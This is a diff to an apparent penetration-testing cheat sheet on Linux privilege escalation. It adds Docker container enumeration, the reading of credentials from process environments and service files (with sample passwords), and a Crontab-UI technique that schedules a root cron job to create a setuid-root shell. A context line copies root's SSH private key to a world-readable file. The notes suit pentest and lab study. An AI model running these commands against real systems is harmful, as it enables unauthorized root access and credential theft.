@@ -1549,6 +1549,61 @@ os.system('cp /root/.ssh/id_rsa /tmp/rootkey && chmod 644 /tmp/rootkey')
 
 **Reference:** https://gtfobins.github.io/gtfobins/dstat/
 
+### Docker Container Detection & Enumeration
+
+**Detect if you're in a container:**
+
+```bash
+# Check for .dockerenv file
+ls -la /.dockerenv
+
+# Check cgroup
+cat /proc/1/cgroup | grep docker
+
+# Hostname is often container ID
+hostname
+```
+
+**Container Enumeration Tools:**
+
+```bash
+# CDK - Container penetration toolkit
+wget https://github.com/cdk-team/CDK/releases/download/v1.5.5/cdk_linux_amd64
+chmod +x cdk_linux_amd64
+
+# Full evaluation
+./cdk_linux_amd64 evaluate --full
+
+# amicontained - Container introspection tool
+wget https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64
+chmod +x amicontained-linux-amd64
+./amicontained-linux-amd64
+```
+
+**Extract credentials from container process environment:**
+
+```bash
+# Container processes often have credentials in environment variables
+ps -elf
+cat /proc/1/environ
+
+# Example output:
+# GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+# GF_SECURITY_ADMIN_USER=enzo
+```
+
+**Capabilities to look for (potential escape):**
+
+```
+CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, 
+DAC_READ_SEARCH, DAC_OVERRIDE, CAP_SYS_RAWIO, 
+CAP_SYSLOG, CAP_NET_RAW, CAP_NET_ADMIN
+```
+
+**Reference:** https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/
+
+---
+
 ### Docker Linux Local PE
 
 ```
@@ -2032,3 +2087,59 @@ bash -p
 - `-c CONFIG_FILE` - Use custom config file
 - `-b` - Run backup (triggers pre_exec_commands)
 - `-f` - Force backup even if recent backup exists
+
+### Crontab-UI Privilege Escalation
+
+Crontab-UI is a web-based cron job manager. If running as root, you can create privileged cron jobs.
+
+**Discovery:**
+
+```bash
+# Default port: 8000 (localhost only)
+ss -antpu | grep 8000
+
+# Check for service
+systemctl status crontab-ui.service
+
+# LinPEAS detection:
+# ═╣ crontab-ui binary found at: /usr/bin/crontab-ui
+# Service: crontab-ui.service (state: active, User: root)
+#   └─ Basic-Auth credentials in Environment: user='root' pwd='P4ssw0rdS0pRi0T3c'
+```
+
+**Credential Locations:**
+
+```bash
+# Service file (may contain creds in Environment)
+/etc/systemd/system/crontab-ui.service
+
+# Database (JSON format, may have passwords in commands)
+/opt/crontabs/crontab.db
+cat /opt/crontabs/crontab.db
+# Look for: zip -P PASSWORD ...
+```
+
+**Access via SSH Tunnel:**
+
+```bash
+ssh user@TARGET -L 1234:127.0.0.1:8000
+# Browse to http://127.0.0.1:1234
+```
+
+**Exploitation:**
+
+1. Access crontab-ui via SSH tunnel
+2. Create new cron job:
+   - **Command:** `cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell`
+   - **Schedule:** `* * * * *`
+3. Save and wait for execution:
+
+```bash
+ls -la /tmp/rootshell
+# -rwsrwsrwx 1 root root ... /tmp/rootshell
+
+/tmp/rootshell -p
+# euid=0(root) egid=0(root)
+```
+
+**Reference:** https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
